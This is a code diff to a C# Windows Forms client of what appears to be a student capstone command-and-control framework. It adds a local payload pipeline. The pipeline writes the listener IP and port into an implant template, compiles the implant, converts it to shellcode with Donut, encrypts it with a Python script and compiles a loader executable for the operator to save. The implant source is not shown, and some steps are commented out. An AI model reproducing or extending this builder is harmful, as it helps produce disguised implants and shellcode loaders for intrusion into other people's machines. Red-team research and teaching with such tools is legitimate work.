@@ -8,6 +8,7 @@ using Microsoft.CodeAnalysis.CSharp.Syntax;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Diagnostics;
 using Newtonsoft.Json;
 using System.Net.Http;
 using MySqlX.XDevAPI;
@@ -748,7 +749,184 @@ Invoke-Run
             dgvImplantConfig.Columns.Insert(0, checkColumn);
         }
 
-        private async void btnGenerateImplantShellcode_Click(object sender, EventArgs e)
+        private void CompileAndConvertToShellcode(string basedirWin, string ip, string port)
+        {
+            string implantFilePath = Path.Combine(basedirWin, "Implant\\Implant.cs");
+
+            try
+            {
+                string originalFileContents = ReadFileContents(implantFilePath, "Read original Implant.cs");
+
+                // Replace the placeholder strings with actual values
+                string modifiedFileContents = originalFileContents
+                    .Replace("public static string host = \"<IP>\";", $"public static string host = \"{ip}\";")
+                    .Replace("public static string port = \"<PORT>\";", $"public static string port = \"{port}\";");
+
+                WriteFileContents(implantFilePath, modifiedFileContents, "Write modified Implant.cs");
+
+                // Proceed with the compilation and conversion to shellcode
+                //ExecuteCompilationAndConversion(basedirWin, implantFilePath, "Compilation and conversion");
+
+                // Revert the file changes
+                WriteFileContents(implantFilePath, originalFileContents, "Revert Implant.cs changes");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"An error occurred: {ex.Message}");
+            }
+        }
+
+        private string ReadFileContents(string filePath, string operation)
+        {
+            try
+            {
+                return File.ReadAllText(filePath);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"{operation} failed: {ex.Message}");
+            }
+        }
+
+        private void WriteFileContents(string filePath, string contents, string operation)
+        {
+            try
+            {
+                File.WriteAllText(filePath, contents);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"{operation} failed: {ex.Message}");
+            }
+        }
+
+        private void ExecuteCompilationAndConversion(string basedirWin, string implantFilePath, string operation)
+        {
+            try
+            {
+                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
+                string donutPath = Path.Combine(basedirWin, "donut\\donut.exe");
+                string implantExePath = Path.Combine(basedirWin, "donut\\Implant.exe");
+                string modulesPath = Path.Combine(basedirWin, "Implant\\Modules\\*.cs");
+                string outputShellcodePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
+
+                // Compile the C# code
+                string compileCommand = $"/c \"{cscPath}\" /unsafe /out:\"{implantExePath}\" \"{implantFilePath}\" \"{modulesPath}\"";
+
+                // Convert the compiled executable to shellcode using Donut
+                string convertCommand = $"/c \"{donutPath}\" -a 2 --input:\"{implantExePath}\" --output:\"{outputShellcodePath}\"";
+                
+                ExecuteCommand(cscPath, compileCommand);
+                ExecuteCommand(donutPath, convertCommand);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"{operation} failed: {ex.Message}");
+            }
+        }
+
+        private void ExecuteCommand(string fileName, string arguments)
+        {
+            using (var process = new Process())
+            {
+                process.StartInfo.FileName = fileName;
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+
+                try
+                {
+                    process.Start();
+                    process.WaitForExit();
+
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    // Append both standard output and error to the text box
+/*                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);*/
+                    if (!string.IsNullOrEmpty(error))
+                    {
+/*                        txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
+                    }
+
+                    // Append command details for reference
+/*                    txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
+                }
+                catch (Exception ex)
+                {
+/*                    txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
+                }
+            }
+        }
+
+        private void EncryptShellcode(string basedirWin)
+        {
+            string pythonScriptPath = Path.Combine(basedirWin, "Encryption\\Cryptocutter.py");
+            string inputFilePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
+            string outputFilePath = Path.Combine(basedirWin, "OutputShellcode\\implant.bin");
+
+            string arguments = $"\"{pythonScriptPath}\" -f \"{inputFilePath}\" -o \"{outputFilePath}\"";
+
+            // Checking the Operating System
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
+            {
+                // For Windows, execute the Python script using python command
+                ExecuteCommand("python", arguments);
+            }
+            else
+            {
+                // For non-Windows systems, you may need to adjust the command
+                // For example, you might directly call 'python' or specify a different path
+                ExecuteCommand("python", arguments);
+            }
+        }
+
+        private void CompileLoader()
+        {
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
+            {
+                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
+                string loaderExePath = @"C:\Users\vquer\Documents\Capstone\Implementation\Loader\Loader.exe";
+                string loaderCsPath = @"C:\Users\vquer\Documents\Capstone\Implementation\Loader\Loader.cs";
+
+                string arguments = $"/out:\"{loaderExePath}\" \"{loaderCsPath}\"";
+
+                ExecuteCommand(cscPath, arguments);
+            }
+            else
+            {
+                // Handle non-Windows systems if necessary
+                Console.WriteLine("This operation is only supported on Windows.");
+            }
+        }
+        private void SaveCompiledLoader()
+        {
+            string loaderExePath = @"C:\Users\vquer\Documents\Capstone\Implementation\Loader\Loader.exe";  // Path of the compiled loader
+
+            using (var saveFileDialog = new SaveFileDialog())
+            {
+                saveFileDialog.Filter = "EXE Files (*.exe)|*.exe";
+                saveFileDialog.DefaultExt = "exe";
+                saveFileDialog.AddExtension = true;
+
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    try
+                    {
+                        File.Copy(loaderExePath, saveFileDialog.FileName, true);
+                        MessageBox.Show($"Loader.exe has been saved to: {saveFileDialog.FileName}");
+                    }
+                    catch (Exception ex)
+                    {
+                        /*txtPayloadGen.AppendText($"An error occurred: {ex.Message}" + Environment.NewLine);*/
+                    }
+                }
+            }
+        }
+
+        private void btnGenerateImplantShellcode_Click(object sender, EventArgs e)
         {
             string selectedName = null;
             string selectedHost = null;
@@ -786,40 +964,15 @@ Invoke-Run
                 Header = "",
             };
 
-            var json = JsonConvert.SerializeObject(listenerData);
+            /*var json = JsonConvert.SerializeObject(listenerData);
+*/
+            CompileAndConvertToShellcode("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\", selectedHost, selectedPort);
 
-            using (var client = new HttpClient())
-            {
-                var content = new StringContent(json, Encoding.UTF8, "application/json");
-                // rTxtMessagesBox.Text = $"Creating implant with config: {listenerData.Name}, {listenerData.IP}, {listenerData.Port}, {listenerData.Header}";
-                var response = await client.PostAsync($"http://{host}:{port}/generate/windows/implant", content);
+            EncryptShellcode("C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\");
 
-                if (response.IsSuccessStatusCode)
-                {
-                    // Prompt the user to select a download location
-                    using (var saveFileDialog = new SaveFileDialog())
-                    {
-                        saveFileDialog.Filter = "EXE Files (*.exe)|*.exe";
-                        saveFileDialog.DefaultExt = "exe";
-                        saveFileDialog.AddExtension = true;
-
-                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
-                        {
-                            using (var fileStream = File.Create(saveFileDialog.FileName))
-                            {
-                                await response.Content.CopyToAsync(fileStream);
-                            }
-
-                            MessageBox.Show($"Loader.exe has been downloaded to: {saveFileDialog.FileName}");
-                        }
-                    }
-                }
-                else
-                {
-                    MessageBox.Show("Error generating shellcode, please check the server");
-                }
-            }
+            CompileLoader();
         }
+
 
 
         private void txtConsoleOutput_TextChanged_1(object sender, EventArgs e)
